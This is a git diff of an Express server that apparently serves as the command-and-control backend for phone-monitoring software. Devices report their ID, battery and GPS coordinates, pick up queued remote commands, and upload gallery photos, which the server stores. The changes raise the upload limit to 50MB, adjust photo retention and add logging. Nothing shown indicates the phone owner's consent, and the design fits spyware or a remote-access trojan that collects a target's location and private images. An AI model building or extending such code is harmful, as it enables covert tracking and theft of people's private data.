@@ -12,8 +12,11 @@ const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
 app.use(cors());
+
+// --- YE BADLAV HAI: Photo badi hoti hai isliye limit 50MB ki hai ---
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+
 app.use(express.static(__dirname));
 
 // Live RAM Memory
@@ -36,9 +39,9 @@ app.post('/api/status', (req, res) => {
         mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
     }
 
-    // 3. Update RAM (Preserving existing command if not 'none')
+    // 3. Update RAM
     devicesStatus[id] = {
-        ...devicesStatus[id], // Purana data rakho
+        ...devicesStatus[id], 
         id: id,
         model: model || devicesStatus[id]?.model || "Unknown Device",
         battery: battery || 0,
@@ -51,7 +54,9 @@ app.post('/api/status', (req, res) => {
         command: "none" // Phone ko response milne ke baad server pe command reset
     };
 
-    console.log(`📡 [PING] ${id} | Cmd Sent: ${pendingCommand}`);
+    if (pendingCommand !== "none") {
+        console.log(`📡 [PING] ${id} | Command Picked: ${pendingCommand}`);
+    }
     
     // Phone ko command bhejo
     res.json({ status: "success", command: pendingCommand });
@@ -95,12 +100,21 @@ app.post('/api/upload_gallery', (req, res) => {
         if (fs.existsSync(filePath)) {
             try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
         }
-        if (galleryData.some(p => p.time === date)) return res.json({ status: "skipped" });
+        
+        // --- YE BADLAV HAI: Nayi photo hamesha upar aayegi (unshift) ---
+        galleryData.unshift({ 
+            time: date || new Date().toLocaleString(), 
+            uploadedAt: Date.now(), 
+            image: image_data 
+        });
 
-        galleryData.unshift({ time: date, uploadedAt: Date.now(), image: image_data });
-        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 200), null, 2));
+        // Sirf last 100 photos rakho taaki file bahut badi na ho jaye
+        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 100), null, 2));
+        
+        console.log(`📸 [GALLERY] New photo uploaded from ${id}`);
         res.json({ status: "success" });
     } catch (error) {
+        console.error("Gallery Save Error:", error.message);
         res.status(500).json({ error: "Failed" });
     }
 });
@@ -117,10 +131,13 @@ app.get('/api/device-status/:id', (req, res) => {
 
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
+    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Command" });
+    
     const id = device_id.toUpperCase().trim();
     if (!devicesStatus[id]) devicesStatus[id] = { id: id };
+    
     devicesStatus[id].command = command;
-    console.log(`🚀 [CMD] ${command} -> ${id}`);
+    console.log(`🚀 [CMD QUEUED] ${command} -> ${id}`);
     res.json({ status: "success" });
 });
 
@@ -130,4 +147,4 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     else res.json([]);
 });
 
-app.listen(PORT, () => console.log(`🔥 SERVER ON ${PORT}`));
+app.listen(PORT, () => console.log(`🔥 SERVER ON ${PORT} WITH 50MB LIMIT`));
